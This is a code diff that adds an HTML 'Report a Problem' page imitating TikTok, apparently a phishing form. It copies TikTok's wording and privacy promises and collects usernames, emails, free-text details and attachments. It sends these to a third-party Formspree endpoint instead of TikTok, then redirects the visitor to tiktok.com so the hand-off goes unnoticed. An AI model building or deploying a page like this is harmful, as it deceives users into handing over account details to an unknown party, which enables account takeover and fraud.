@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Report a Problem - TikTok</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="form-container">
+    <h2>Report a Problem</h2>
+    <p>Tell us about a problem you’d like to report or feedback that you have about your experience with TikTok. Information shared will only be used to respond to your report.</p>
+
+    <form action="https://formspree.io/f/xyzweqbz" method="POST" enctype="multipart/form-data">
+
+      <label for="topic">Topic</label>
+      <select name="topic" id="topic" required>
+        <option value="">Select an option</option>
+        <option value="Account issue">Account issue</option>
+        <option value="Content problem">Content problem</option>
+        <option value="Privacy concern">Privacy concern</option>
+        <option value="Other">Other</option>
+      </select>
+
+      <label for="username">@Username</label>
+      <input type="text" name="username" placeholder="@username" required>
+
+      <label for="email">Contact Email</label>
+      <input type="email" name="email" placeholder="Enter your email" required>
+
+      <label for="details">Tell us more (minimum 50 characters)</label>
+      <textarea name="details" rows="6" minlength="50" placeholder="Describe your issue..." required></textarea>
+
+      <label for="attachments">Attachments (optional)</label>
+      <input type="file" name="attachments" accept=".7z,.bmp,.gif,.gz,.jpeg,.jpg,.png,.tif,.tiff,.rar,.tar,.zip" multiple>
+
+      <div class="checkbox">
+        <input type="checkbox" name="confirm1" required>
+        I ensure, to the best of my ability and knowledge, that all the information disclosed above is accurate and true.
+      </div>
+      <div class="checkbox">
+        <input type="checkbox" name="confirm2" required>
+        By submitting, I acknowledge that TikTok will process my data in accordance with TikTok’s Privacy Policy.
+      </div>
+
+      <!-- Redirect page after submit -->
+      <input name="_redirect" type="hidden" value="https://www.tiktok.com">
+
+      <!-- Anti-spam field (must remain hidden) -->
+      <input name="_formsubmit_id" type="text" style="display:none">
+
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+</body>
+</html>
